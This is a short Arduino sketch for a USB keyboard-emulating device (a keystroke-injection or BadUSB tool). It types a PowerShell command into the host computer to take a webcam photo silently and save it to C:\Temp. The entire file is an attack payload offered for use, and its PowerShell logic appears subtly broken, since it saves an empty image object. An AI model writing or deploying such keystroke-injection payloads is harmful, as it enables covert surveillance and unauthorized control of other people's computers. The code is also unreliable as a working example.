#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"$webcam = New-Object -ComObject WIA.ImageFile; $device = (New-Object -ComObject WIA.DeviceManager).Devices.Item(1); $device.ExecuteCommand( '{AF933CAC-ACAD-11D2-A093-00C04F72DC3C}'); $webcam.SaveFile('C:\\Temp\\webcam.jpg')\""));
}
